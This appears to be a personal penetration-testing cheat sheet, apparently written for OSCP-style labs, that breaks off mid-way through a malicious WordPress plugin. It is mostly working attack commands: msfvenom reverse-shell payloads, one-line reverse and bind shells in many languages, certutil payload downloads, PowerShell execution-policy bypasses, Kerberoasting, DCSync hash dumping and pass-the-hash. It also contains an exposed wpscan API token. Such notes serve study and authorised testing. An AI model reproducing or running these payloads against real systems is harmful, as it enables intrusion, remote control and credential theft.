        > sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.135 LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o ~/SystemsHacked/10.11.1.5/ms17-010.exe
    - Windows 64bit single stage reverse, output exe file:
        > msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.135 LPORT=8899 -f exe -o shellmeX64p8899.exe
        > msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.156 LPORT=53 -f exe -o reverse.exe
## Windows Single Stage EternalBlue MS17-010
    - Windows 32bit single stage reverse, output exe file -- for 42315.py:
        > msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f exe > blue.exe
    - Windows 32bit single stage reverse, output exe file -- for sleepya:
        > sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.135 LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o ~/SystemsHacked/10.11.1.5/ms17-010.exe

## Linux Single stage
    - Linux 32bit single stage reverse shell
        > msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f elf > 1337x86.esp
    - Linux 64bit single stage reverse shell
        > msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f elf > 1337x64.esp
    - Linux 64bit command
        > msfvenom -p linux/x64/exec CMD="ping -c 2 192.168.49.131" -f elf shell.elf
    - Linux 64bit shared libary
        - perform a ldd on the binary in question
            > ldd stupidbin
        - Check if you can write to any of the library paths, or the library is missing
        - create your own
            > msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=192.168.49.91 LPORT=21 -f elf-so -o utils.so


## Linux Perform a command
    - Windows 64bit single stage reverse, perform command python:
        > msfvenom -p linux/x86/exec CMD='/bin/bash -i >& /dev/tcp/10.10.14.28/4444 0>&1' -b '\x00\x0a\x0d' -f csv -v payload

## Linux Single stage shell code
    - Linux 32bit single stage reverse, output shell code python:
        > msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.156 LPORT=4444 -b "\x00\x0a" -f py -v shellcode

## Powershell
    - Windows 32bit single stage reverse, output powershell shell code:
        > msfvenom -p windows/meterpreter/reverse_tcp LHOST=191.168.119.135 LPORT=4444 -f powershell

## Java files
    - Windows single stage reverse, output jsp file:
        > msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.135 LPORT=443 -f raw -o bummer.jsp
    - Windows single stage reverse, output war file:
        > msfvenom -p java/shell_reverse_tcp lhost=10.10.14.18 lport=4444 -f war -o pwn.war

## Wordpress plugin
    - Wordpress php used for plugins
        > msfvenom -p php/reverse_php LHOST=192.168.49.89 LPORT=80 -f raw > shell.php
        - Go to the "wordpress" section of this document for more info on how to create a plugin and upload

## Ruby
    - ruby reverse shell
    > msfvenom -p cmd/unix/reverse_ruby lhost=192.168.1.103 lport=5555 R

## Metasploit
### Windows Multi Stage
    - Windows 32bit multi stage reverse, output .exe:
        > msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.135 LPORT=4444 -f exe -o shellmeX86p9999MP.exe
    - In msfconsole
        > use multi/handler
        > set payload windows/meterpreter/reverse_https
        > set LHOST
        > set LPORT
        > show options
        > exploit -j
        > jobs
        > jobs -i 0

### Windows SMB login
    > use auxiliary/scanner/smb/smb_login
    > set rhosts 192.168.1.105
    > set user_file user.txt
    > set pass_file pass.txt
    > set smbdomain ignite
    > exploit

### Linux Multi stage
    - Linux 32bit multi stage reverse, output shellcode:
        > msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.119.135 LPORT=4444 -f py -v shellcode
    - In msfconsole
        > use multi/handler
        > set payload linux/x86/meterpreter/reverse_tcp
        > set LHOST
        > set LPORT
        > show options
        > exploit -j
        > jobs
        > jobs -i 0


# Reverse / Bind Shells (reverse shell)
------------------------
Linux Shell NOTE!!!!!!
    --- If RCE is not working, try /bin/sh instead of /bin/bash

- Bash:
    > bind > /bin/bash -i >& /dev/tcp/$ip/4443 0>&1
    > bind > /bin/bash -i >& /dev/tcp/192.168.49.91/80 0>&1
- netcat without -e flag
    > bind > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.1.156 4445 >/tmp/f
    > bind > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 9001 >/tmp/f
    > shell shock > rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>&1|nc%2010.10.14.18%20443%20>/tmp/f
- netcat linux (reverse shell)
    > listen > nc -nlvp 4443
    > bind > nc $ip 4443 -e /bin/sh
- netcat linux (bind shell0
    > listen(victim) > nc -nlvp 4443 -e /bin/bash
    > bind > nc $ip 4443 -e /bin/sh
- netcat windows (reverse shell)
    > listen > nc -nlvp 4443
    > bind > nc.exe $ip 4443 -e cmd.exe
- netcat windows (bind shell)
    > listen (victim) > nc.exe -nlvp 4444 -e cmd.exe
    > bind > nc.exe -nv $ip 4444

- socat Linux (reverse shell) NOTE! "-d -d" shows log output
    > listen (kali) > sudo socat -d -d TCP4-LISTEN:443 STDOUT
    > bind (linux) > sudo -u root /usr/bin/socat TCP4:10.9.202.21:443 EXEC:/bin/bash

- python
    > bind > os.system('bash -c "bash -i >& /dev/tcp/10.10.14.28/4446 0>&1"')
    > bind > os.system('socat TCP:192.168.49.153:80 EXEC:bash')
    > bind > python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    - If creating actual file (like reverse.py) add this to the file and download with wget: 
        import socket,subprocess,os
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.10.14.28",4445))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(["/bin/bash","-i"])
    > ping > python -c 'import os;host="192.168.49.104";pingme=os.system("ping -c 2 " + host);'
    > ping > python -c 'import os;os.system("ping -c 2 192.168.49.153");'
    > eval being used on text box > os.system('bash -c "bash -i >& /dev/tcp/192.168.49.165/5555 0>&1"')#
- perl
    > bind > perl -e 'use Socket;$i="$ip";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
- powershell:
    > reverse > powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.18',4446);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    > bind  > powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
    - For code injection
        > echo |set /p="$client = New-Object System.Net.Sockets.TCPClient("$ip",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
- Ruby
    > ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
- PHP (Try with all versions of PHP)
    > php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
    - use a reverse webshell
        NOTE: try changing to "phtml" if .php extension cant be used
        - Windows
            > /usr/share/webshells/php/windows-php-reverse-shell/wrs.php
        - Linux
            > /usr/share/webshells/php/php-reverse-shell.php

- Java
    > r = Runtime.getRuntime()
      p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
      p.waitForA)
    - Link provides details on oracle java reverse shell by decenteralization
        http://obtruse.syfrtext.com/2018/07/oracle-privilege-escalation-via.html
- Nodejs:
    - Create a "reverse.sh"
    (function(){
    var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.14.28", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
    })();

- egressbuster
    ! You must have access to the victim via webshell or some other means. Must be able to upload egressbuster.py to victum too
    - Upload "~/notes/exam/egressbuster/egressbuster.py" to the victim (or the .exe if windows).

        - On kali 
            > sudo python3 ./egress_listener.py 192.168.49.167 tun0 192.168.167.64 shell
            - "192.168.49.167" is kali tun0 ip, "192.168.167.64" is the victim interface

        - On victim 
            > ./egressbuster.py 192.168.49.167 1-65536 shell

    - wait for the listener to show ports that come through, these are usable!
    - then set up your own reversehell or use the one provided in egressbuster


# Transfer File
----------------
## Third party tools
    - netcat (From windows to kali):
        > kali > nc -l -p 4443 > root.txt
        > Windows > nc.exe -w 3 10.10.14.18 4443 < root.txt
    - netcat (From Kali to Windows):
        > windows > nc.exe -nlvp 127.0.0.1 4444 > incoming.exe
        > kali > nc -nv 192.168.119.135 4444 < /path/to/file.exe 
    - netcat (From Kali to Linux):
        > Linbox > nc -nlvp 3000 > incoming.sh
        > kali > nc -w 3 192.168.131.97 3000 < incoming.sh
    - netcat (From linux to Kali)
        > kali > nc -nlvp 3000 > incoming.exe
        > Linbox  > ./nc -w 3 10.10.14.18 3000 < incoming.txt
        OR
        > Linbox > cat file.exe | nc 192.168.119.135 3000
        - Make sure to CTRL-C from kali to end the session and send something else
    - socat:
        > server > sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
        > client > socat TCP4:192.168.1.177:443 file:recieved_secret_passwords.txt,create

## Windows Tools:
- certutil: Transfer encoded / decode:
  http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html 
  https://www.hackingarticles.in/windows-for-pentester-certutil/
    - On kali, convert file to base64
        > base64 dll.txt
    - Run webserver
        > python -m SimpleHTTPServer 8088
    - On windows
        > certutil.exe -urlcache -split -f http://192.168.1.110:8088/dll.txt dll.txt
        > certutil.exe -decode .\dll.txt mydll.dll
        > regsvr32 /s /u mydll.dll

    - On windows no encryption
        > certutil.exe -urlcache -split -f http://10.10.14.25:8088/nc.exe C:\Users\Public\Downloadsnc.exe
 
### Powershell transfer / bypass exeuction policy

- "Red team cheet sheet"
    https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70

- Check execution policy
    > Get-ExecutionPolicy
    > Get-ExecutionPolicy -List | Format-Table -AutoSize
    > Get-ExecutionPolicy -Scope CurrentUser
- Change execution policy
    > Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
- Bypass
    > powershell --executionPolicy bypass
    > powershell -c <cmd>
    > powershell -encodedcommand
    > $env:PSExecutionPolicyPreference="bypass"
- Run the script
    > powershell.exe -noprofile "<code>"
- Change to encoded bytes in powershell
    > $command = "Write-Host 'Hello, World'; calc.exe"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command);$encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand
- Invoke-Command
    > invoke-command -scriptblock {Write-Host "Hello dude"; calc.exe}
- Run the script (in base64)
    > run msfvenom powershell output (see above)
    > swap shell code in ~/notes/exam/reverseshell-from-msfshellcode.ps1
    > ~/notes/exam/ps_encoder.py -s reverseshell-from-msfshellcode.ps1 | xclip -sel clip
    > run msfconsole with multi/handler and listen
    > powershell.exe -noprofile -encodedCommand <base64code from xclip>
- Get-content
    > Get-Content .\script.ps1 | powershell.exe -noprofile -
- Disable by swapping out auth manager
    > function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}; Disable-ExecutionPolicy; .\yourscript.ps1
    


# Network enumeration
---------------------
## Auto Tools:
    - autorecon
        > sudo autorecon 10.11.1.100
    - nmapAutomator
        > nmapAutomator 10.11.1.100 Quick
        > nmapAutomator 10.11.1.100 Full
        > nmapAutomator 10.11.1.100 All

## Nmap:

### Most used nmap parameters
    - '-p-' Scan all TCP ports
    - '-sU' Scan UDP ports
        - '--top-ports <value>' Scan 0-<value> UDP ports
    - '-sV' Service and version scan
    - '-vv' Verbose output
    - '-oN <filename>' Send output to a file
    - '-sC' Script scanning
    - '-O' OS detection
        - '--osscan-guess' Guess os based on fingerprint

### scans examples:
    - Good site for nmap scans:
        - https://www.stationx.net/nmap-cheat-sheet/
        - https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html

### nmap Inital scans:
    - ping sweep:
        > nmap -sP 10.11.1.1-20
    - TCP syn sweep:
        > sudo nmap -sS 10.11.1.0/24

### The host wont respond to ping!!
    - sudo nmap -sS -Pn 192.168.103.66

### nmap speed up scan
    - Use the flag "-T4"

### nmap initial enumeration scans:
    > tnas $ip 1,2,4,5
    `- sudo nmap -p- -sV -vv -oN _nmap_tcp_quick 10.10.10.97
    `- sudo nmap -sC -sV -p- -vv -oN _nmap_tcp_full 10.10.10.97
    `- sudo nmap -sU --top-ports 1000 -oN _nmap_udp_1000 $ip0
    `- sudo nmap -O --osscan-guess -oN _nmap_os 10.10.10.97

### nmap scans:
    - TCP Scan (quick):
        > sudo nmap -sC -sV -vv -oA quick $ip
    - TCP Scan (full):
        > sudo nmap -sC -sV -p- -vv -oA full $ip
    - UDP Scan (quick):
        > sudo nmap -sU -sV -vv -oA quick_udp $ip
    - UDP Scan (full):
        > sudo nmap -sC -sV -p- -vv -oA full $ip
        > sudo nmap -sC -sV -O -oA initial $ip
    - Port Knock:
        > knock 10.10.10.24 1706
        > for x in 7000 8000 9000; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x $ip; done

### nmap OS scan
    - OS Scan:
        > sudo nmap 192.168.1.1 -O --osscan-guess
        > sudo nmap 10.11.1.220 --script=smb-os-discovery

### nmap traceroute tcp
    > sudo nmap -Pn --traceroute -p 8000 destination.com

### netcat scans
    - Port Scanning (single host):
        - netcat: (TCP Scan)
            > nc -nvv -w 1 -z 10.11.1.220 3388-3390
        - netcat: (UDP Scan) 
            > nc -nv -u -z -w 1 10.11.1.115 160-162
        - Wireshark filter on [SYN,ACK] 
            - "tcp.flags==0x12"

### webDAV testing
    - davtest
        > davtest -url http://10.10.10.15
        - review what file types can be uploaded, upload with cadaver the file type.

### Other service scanning:

## IRC
    - irc (Unreal)
        > nc -nlvp 4444
        > nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.6 4444"  10.10.10.117
        > nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='nc 4444 -e /bin/sh 10.10.14.6' 10.10.10.117

## DNS and domain lookups
    - Try to find any type of domain on a website.
    - If https check certificate info, subject name may give it away 
    - You must edit your /etc/hosts file to add entries (<server ip> <specific domain to test>)
        - confirm with dig requests, need to get IP addresses back
        - dig 
            - query host
                > dig @10.10.10.161 forest.htb.local
            - request zone transfer
                > dig axfr @10.10.10.161 htb.local
            - Hostname
                - Must configure "search" groups. For netplan under nameservers add "search:" then add below "- your.domain"
                > dig +search A hostname @172.39.90.12
            - FQDN
                > dig A hostname.domain.com @172.39.90.12
            - PTR
                > dig -x 172.39.90.39 @172.39.90.12

    - Forward look up:
        > for ip in $(cat list.txt);do host $ip.megacorpone.com; done

    - IP address resolve hostnames:
        > for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"

    - Request zone transfer file:
        > host -l <domain name> <dns server address>
        > for hn in $(seq 1 3);do host -l megacorpone.com ns $hn.megacorpone.com; done
        > host -t ns megacorpone.com | cut -d " " -f 4

    - DNS enumeration:
        - dnsrecon:
            > dnsrecon -d megacorpone.com -t axfr 
            > dnsrecon -d megacorpone.com -D ~/list.txt -t brt
        - dnsenum:
            > dnsenum megacorpone.com
        - fierce:
            > fierce -dnsserver $ip0 -dns megacorpone.com

## LDAP
    - jxplorer
        > jxplorer
        - file > connect
            - Host: <IP address>
            - try anonymous login. If it does not work use a usename and password
            - Right click the domain "refresh"
    - ldapdomaindump (requires user creds)
        - NOTE: this may fail (get a UnicodeDecodeError) htb, PG, and oscp machines if the scheme is changed
            > ldapdomaindump 10.10.10.161 -u 'domain\username' -p 'password' -o /output/file/path --authtype SIMPLE
            > ldapdomaindump ldap://10.10.10.161
    - ldapsearch (null creds), if output "bind must be completed" or "operations error", you need creds. 
        - ldapsearch -h $ip0 389 -x -s base -b '' "(objectClass=*)" "*" +

        - NOTE: "-D" is the username --> 'domain\username'
                "-w" is hte passwrod --> 'password'
        - Dump hole database (WARNING: very large! output to file)
            > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "DC=htb,DC=local" > ldap-dump.txt
        - Check for access to user passwords
            > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "DC=htb,DC=local" | grep 'userpas"
        - Dump users
            > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Users,DC=htb,DC=local" > ldap-dump-users.txt
        - Dump computer
            > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Computers,DC=htb,DC=local" > ldap-dump-computers.txt
        - Dump Domain Admins
            > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Domain Admins,CN=Users,DC=htb,DC=local" > ldap-dump-users-domainAdmins.txt
        - Dump Enterprise Admins
            > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Enterprise Admins,CN=Users,DC=htb,DC=local" > ldap-dump-users-enterpriseAdmins.txt
        - Dump Administrators
            > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Administrators,CN=BuiltinDC=htb,DC=local" > ldap-dump-users-Administrators.txt
        - Dump Remote Desktop Group
            > ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "CN=Remote Desktop Users,CN=BuiltinDC=htb,DC=local" > ldap-dump-users-RemoteDesktopUsers.txt
    - ldapgatherer
        > ldapgather -u '' -p '' -s 10.10.10.161 -d htb.local
    - ldapgatherer.py
        > ./ldapgatherer.py
    - python ldap3
        > python3
        >>> import ldap3
        >>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =389, use_ssl = False)
        >>> connection = ldap3.Connection(server)
        >>> connection.bind()
        True
        - Gather all info
        >>> server.info
        >>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
        True
        >> connection.entries
        - Dump all of ldap
        >> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
        True
        >>> connection.entries

## Kerberos
    - kerbrute (Brute force access)
        > kerbrute bruteuser --dc 10.10.10.161 -d htb.local -v -t 200 --safe /usr/share/wordlists/rockyou.txt sebastien
    - GetNPUsers.py (pull hash of each user)
        > for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
        - Or just run the following
            > GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request
    - Kerberoasting
        - Powershell
            > iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1") 
            > Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
        - GetUsersSPNs.py (pull hashes for specific users)
            > GetUserSPNs.py -request -dc-ip $ip0 active.htb/svc_tgs -save -outputfile GetUsersSPNs.out
            - check .out file for ticket
    - Crack hash
        - pull hash with GetNPUsers.py, any lines found put the whole hash into a file.
            - Copy whole thing! "$krb5asrep$23$svc-alfresco@HTB:5208fc44fd91841c26f47b28712....etc."
        - use hashcat

            7500  | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols
            13100 | Kerberos 5, etype 23, TGS-REP                    | Network Protocols
            18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols
            19600 | Kerberos 5, etype 17, TGS-REP                    | Network Protocols
            19700 | Kerberos 5, etype 18, TGS-REP                    | Network Protocols
            19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols
            19900 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols

            > hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force
            > hashcat -m 13100 GetUsersSPNs.out /usr/share/wordlists/rockyou.txt --force

## Active Directory
    - Good links on how to use all of Impackets tools and running commands
        - https://neil-fox.github.io/Impacket-usage-&-detection/
        - https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
    - Must get access to system first (RDP, evil-winrm, telnet, etc.)
    - Enumeration
        - Data gathering
            - Local:
                - sharphound.ps1
                - sharphound.exe
            - Remote:
                - Bloodhound-python
                    > bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c All
                    - You should now have 4 .json files
        - Analyize 
            - Open neo4jdb (MAKE sure to check your /etc/hosts file and make sure "localhost 127.0.0.1" is set)
                > sudo neo4j console
            - Open bloodhound3 (DONT USE SUDO)
                > bloodhound
            - Login (neo4j/<your password>)
            - Select "upload data" on the right (Highlight all 4 .json files, and select "Upload")
            - Seach for your user you have access to top left ("svcalfresco@htb.local")
            - Select user in graph
            - Select "Node Info" on left
            - Select "Reachable high value targets"
    - Add a admin user (if you have found poorly configured group permissions to allow you to create users)
        - Download PowerView.ps1 onto the system first
            > certutil.exe -urlcache -split -f http://10.10.14.25:8088/PowerView.ps1 C:\Users\svc-alfresco\Downloads\PowerView.ps1
        - Run the following commands to create a user for Impacket to gather hashs with
            > Import-Module .\PowerView.ps1
            > net user eivluser password /add /domain
            > net group "Exchange Windows Permissions" /add eviluser
            > $pass = convertto-securestring 'password' -AsPlainText -Force
            > $cred = New-Object System.Management.Automation.PSCredential('htb\eviluser', $pass)
            > Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity rana -Rights DCSync
        - From Kali run the following to gather hashes
            > impacket-secretsdump htb.local/eviluser:password@10.10.10.161
        - Pass the hash
            > psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 -target-ip 10.10.10.161 administrator@10.10.10.161
            > pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 \\10.10.10.161 cmd.exe
    - gpp-decrypt (Decrypt Group Policy Preferences password)
        - Good information found here
            - https://adsecurity.org/?p=2288
        - Find gpp files (In Windows)
            > findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
        - gpp-decrypt
            > gpp-decrypt <aes-256 "cpassword" string>


# Service Enumeration
---------------------
## web enumeration
    - virtual host discovery
        - ruby scrpit
            - Read this --> https://github.com/Hacker0x01/h1-212-ctf-solutions/blob/master/writeups/tompohl.md 
            > ruby ~/notes/exam/virtual-host-discovery/scan.rb --ip=10.10.10.56 --wordlist=~/notes/exam/virtual-host-discovery/wordlist --ignore-content-length=11321 --host=shocker.htb > virt-hosts.out
            > cat virt-hosts.out | grep Found | grep 200 | awk -F ':' '{print$2}' | awk '{print$1}' | grep "\."
            - Once found you can add those names to your /etc/hosts and then pound away.
        - VHostScan
            > VHostScan -t 10.10.10.123 -w ~/notes/exam/virtual-host-discovery/wordlist --suffix ".friendzoneportal.red" --ssl -p 443 --ignore-http-codes 404,400
    - nikto commands
        > nikto -ask=no -h http://10.11.1.73:8080
    - go buster commands
        - NOTE!!! Some pages may give back a 200OK for every page. You must specify ' -s "204,301,302,307,401,403" ' if true, that way 200 will be considred bad!
        - NOTE2!! If a page has a .htpasswd file you will need to use -U and -P flags. MUST be in the beginning of the statement (before any other paremters)
        - NOTE3!!! ignore 403 responses -s "200,204,301,302,307" ' if true, that way 200 will be considred bad!
        - Windows (for https use "-k" remember to lower thread count -t50, also TURN OFF PROXY)
            - Common words 
                > gobuster dir -w /usr/share/wordlists/dirb/common.txt -s "200,204,301,302,307" -x "html,php,asp,aspx,txt" -t100 -u http://10.10.10.137:47001 -o gobust_common_.txt
            - Medium words 
                > gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -s "200,204,301,302,307" -x "html,php,asp,aspx,txt" -t100 -u http://10.10.10.137:47001 -o gobust_medium_.txt
        - Linux (for https use "-k", remember to lower thred count -t50)
            - Common words 
                > gobuster dir -w /usr/share/wordlists/dirb/common.txt -s "200,204,301,302,307" -x "html,php,jsp,cgi,txt" -t100 -u http://10.10.10.138:555 -o gobust_common_.txt
            - Medium words 
                > gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -s "200,204,301,302,307" -x "html,php,jsp,cgi,txt" -t100 -u http://10.10.10.138:555 -o gobust_medium_.txt
        - autorecon script:
            > gobuster dir -u http://10.11.1.73:5357 -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o "/home/dave/SystemsHacked/10.11.1.73/results/10.11.1.73/scans/tcp_5357_http_gobuster_big.txt"
        - another way to scan
            > gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 40 -u http://10.10.10.143 -o scans/gobuter-80-root-php
    - feroxbuster
        - general scan
            > feroxbuster -k --depth 2 --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt --extract-links -u http://192.168.244.117:18000 -o feroxbust_large_18000.txt
        - only include specific return codes  
            > feroxbuster -k -s 200,204,301,302,307 --depth 2 --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt --extract-links -u http://192.168.41.136:40873 -o feroxbust_large_40873.txt

        - OH NO 200's!!! (Filter out the size of each 200 response)
            - First access a page that gives a 200 ("/fuck") -> send to burp
            - send capture to repeater, and send again, read the size in the bottom right hand corner. Use that for the filter size
            > feroxbuster --filter-size 1924 --depth 2 --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -t 200 -u http://192.168.1.106:3000 -o feroxbust_small_3000.txt
    - ffuf
        - OH NO 200's!!! (Filter out the size of each 200 response)
            > ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.1.106:3000/FUZZ -fs 1924 -o ffuf_small_3000 -of md




    - webgrabber (gather what web page looks like)
        - run gobuster first with an output file, then feed output file into the command below
        > webgrabber http://10.10.10.82 gobust_dh_medium_80.txt
    - dirbuster
        > dirbuster
        > dirbuster -l /usr/share/wordlists/dirb/common.txt -e php,txt,cgi,html,jsp
        > dirbuster -l /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -e php,txt,cgi,html,jsp
            - set speed to "faster" to get more threads
    - word press
        - read this site --> https://www.armourinfosec.com/wordpress-enumeration/
        - Make sure to check the absolute path in wp site, make sure you have the hosts name in /etc/hosts. Or the path is correct.
        - Try to access /wp-login.php for site login
        - Using "wpscan"
            - regular scan
                > wpscan --url sandbox.local --enumerate ap,at,cb,dbe
            - aggressive scan with api token
                > wpscan --url http://10.10.10.88/webservices/wp --no-update -e ap --plugins-detection aggressive --plugins-version-detection aggressive --api-token CnKYeaIBqnq8a87OUF3Wd8rbkqpOvjWttJsMry2ZatI| tee wpscan2.out
                > wpscan --url http://10.11.1.73:2869 --no-update -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee "/home/dave/SystemsHacked/10.11.1.73/results/10.11.1.73/scans/tcp_2869_http_wpscan.txt" --api-token CnKYeaIBqnq8a87OUF3Wd8rbkqpOvjWttJsMry2ZatI
            - wordpress login brute force
                > wpscan --url http://10.10.10.37 --usernames 'admin' --passwords /usr/share/wordlists/rockyou.txt
        - Using "nmap"
            > nmap 10.10.10.37 --script=/usr/share/nmap/scripts/http-wordpress-brute.nse,http-wordpress-enum.nse,http-wordpress-users.nse
        - Username enumeration
            - Check the admin of the system by going to the site with "http://10.10.10.37/?author=1"
            - You can also go to the login page to enter a username to see if "you entered for the username $user is incorrect" indicating that is a valid user on the system
        - Core version
        - wordpress plugin upload
            - wordpress plugin upload (MUST have admin login for the wp-admin portal for this to work)
                > msfvenom -p php/reverse_php LHOST=192.168.49.89 LPORT=80 -f raw > shell.php
                - Create plugin file, contents of "evilplugin.php"
                    <?php
                    /**
                    * Plugin Name: EvilPlugin
